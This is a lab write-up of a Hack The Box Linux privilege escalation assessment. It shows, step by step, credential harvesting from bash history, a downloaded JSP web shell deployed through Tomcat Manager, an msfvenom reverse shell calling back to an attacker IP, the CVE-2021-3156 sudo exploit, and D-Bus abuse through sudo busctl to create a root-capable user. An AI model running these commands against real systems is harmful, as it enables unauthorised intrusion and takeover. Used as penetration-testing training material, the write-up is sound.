## Linux Privilege Escalation - Skills Assessment Write-up


### Objective

The goal of this assessment was to escalate privileges from a standard user account to root access on the target Linux system, identifying and exploiting various misconfigurations along the way to capture all five flags.


### Initial Reconnaissance

Started with initial enumeration of the current user context:

```bash
htb-student@nix03:~$ id

uid=1002(htb-student) gid=1002(htb-student) groups=1002(htb-student)
```

The initial assessment revealed a standard user account with no privileged groups.


#### Flag 1 Discovery

Examined the bash history file which revealed previous activity:

```bash
htb-student@nix03:~$ cat .bash_history 

id
ls
ls /var/www/html
cat /var/www/html/flag1.txt 
exit
```

The history indicated a flag file that had been moved. Conducted a system-wide search:

```bash
htb-student@nix03:~$ find / -name *flag1* 2>/dev/null

/home/htb-student/.config/.flag1.txt
```


#### User Enumeration and Flag 2

Discovered another user account barry and examined their home directory:

```bash
htb-student@nix03:~$ ls -la /home/barry/

total 40
drwxr-xr-x 5 barry barry 4096 Sep  5  2020 .
drwxr-xr-x 5 root  root  4096 Sep  6  2020 ..
-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
-rw-r--r-- 1 barry barry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 barry barry 3771 Feb 25  2020 .bashrc
drwx------ 2 barry barry 4096 Sep  5  2020 .cache
-rwx------ 1 barry barry   29 Sep  5  2020 flag2.txt
drwxrwxr-x 3 barry barry 4096 Sep  5  2020 .local
-rw-r--r-- 1 barry barry  807 Feb 25  2020 .profile
drwx------ 2 barry barry 4096 Sep  5  2020 .ssh
```

The bash history for barry revealed credentials for lateral movement:

```bash
htb-student@nix03:~$ cat /home/barry/.bash_history

sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
```

Used these credentials to access the barry account:

```bash
htb-student@nix03:~$ su barry
Password: i_l0ve_s3cur1ty!
```


#### Privilege Enumeration as Barry && Flag 3 Discovery

```bash
barry@nix03:/$ id

uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```

The `adm` group membership provided read access to system logs, leading to Flag 3:

```bash
barry@nix03:~$ find /var/log/ -name *flag3* -exec ls -la {} \; 2>/dev/null

-rw-r----- 1 root adm 23 Sep  5  2020 /var/log/flag3.txt
```


#### Tomcat Service Discovery

Discovered Tomcat service and associated flag:

```bash
barry@nix03:~$ find / -name *flag4* 2>/dev/null

/var/lib/tomcat9/flag4.txt
```

```bash
barry@nix03:~$ ls -la /var/lib/tomcat9/flag4.txt

-rw------- 1 tomcat tomcat 25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
```


#### Configuration File Analysis

Found backup Tomcat configuration files with weak permissions:

```bash
barry@nix03:/etc/tomcat9$ ls -la tomcat-users.xml*

-rw-r----- 1 root tomcat 2232 Sep  5  2020 tomcat-users.xml
-rwxr-xr-x 1 root barry  2232 Sep  5  2020 tomcat-users.xml.bak
```

Extracted Tomcat manager credentials from the backup file:

```xml
...
<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" 
      roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```


#### Tomcat Manager Exploitation && Flag 4 obtaining

Used discovered credentials to access Tomcat Manager at `http://10.129.235.16:8080/manager`. Deployed a web shell:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r hello.war cmd.jsp
```

Uploaded the WAR file through the manager interface and executed commands:

```bash
curl -s "http://10.129.235.16:8080/hello/cmd.jsp?cmd=cat%20%2Fvar%2Flib%2Ftomcat9%2Fflag4.txt"
```

While the web shell provided command execution, deploying a reverse shell offered more reliable and interactive access.
Created a malicious WAR file with a reverse shell payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.9 LPORT=8888 -f war > hello2.war
```

Deployed the reverse shell through the Tomcat Manager interface and caught the connection with `nc`:

```bash
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.235.16] 35866

pwd
/var/lib/tomcat9

id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```


#### Privilege Escalation to Root

Discovered sudo privileges for the tomcat user:

```bash
tomcat@nix03:/home/mrb3n$ sudo -l

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

And `sudo` version:

```bash
tomcat@nix03:/home/mrb3n$ sudo -V

sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```


##### Method 1: CVE-2021-3156 Exploitation

Downloaded and prepared the privilege escalation exploit:

```bash
# On attacker machine

git clone https://github.com/blasty/CVE-2021-3156.git
```

Modified the `Makefile` to use static compilation:

```
all:
	rm -rf libnss_X
	mkdir libnss_X
	gcc -std=c99 -static -o sudo-hax-me-a-sandwich hax.c
	gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Reason for Static Compilation: The target system might have different library versions or missing dependencies that could prevent a dynamically linked binary from executing properly. By using the -static flag, the binary becomes self-contained with all necessary libraries embedded, ensuring reliable execution on the target system regardless of its library environment.

Compiled and deployed the exploit:

```bash
make
tar -zcvf CVE-2021-3156.tar.gz CVE-2021-3156
scp CVE-2021-3156.tar.gz barry@10.129.235.16:~/
```

On the target host I moved the file to `/tmp`, did `tar -zxvf CVE-2021-3156.tar.gz` and:

```bash
tomcat@nix03:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 1
```

And got a root shell.


##### Method 2: D-Bus Privilege Escalation

Used busctl to create a privileged user:

```bash
tomcat@nix03:/tmp$ sudo /usr/bin/busctl call org.freedesktop.Accounts /org/freedesktop/Accounts org.freedesktop.Accounts CreateUser ssi "hacker" "Hacker" 1
tomcat@nix03:/tmp$ sudo /usr/bin/busctl call org.freedesktop.Accounts /org/freedesktop/Accounts/User1003 org.freedesktop.Accounts.User SetAccountType i 1
tomcat@nix03:/tmp$ sudo /usr/bin/busctl call org.freedesktop.Accounts /org/freedesktop/Accounts/User1003 org.freedesktop.Accounts.User SetPassword ss "" ""
```

Switched to the new privileged user:

```bash
htb-student@nix03:/tmp$ su - hacker
hacker@nix03:~$ sudo ls /root

flag5.txt  snap
```


### Results

Successfully captured all five flags through a systematic privilege escalation chain:
 - Flag 1: User history analysis
 - Flag 2: Credential discovery and lateral movement
 - Flag 3: Group privilege exploitation
 - Flag 4: Service configuration weakness
 - Flag 5: Root access achieved


## Conclusion

The assessment demonstrated multiple privilege escalation vectors:
 - Weak file permissions on configuration backups
 - Service account misconfigurations
 - Excessive privileges granted via D-Bus
 - Credential exposure in history files

Each vulnerability in the chain provided incremental access, ultimately leading to complete system compromise.
The exercise highlighted the importance of proper service configuration, secure credential storage, and principle of least privilege implementation.
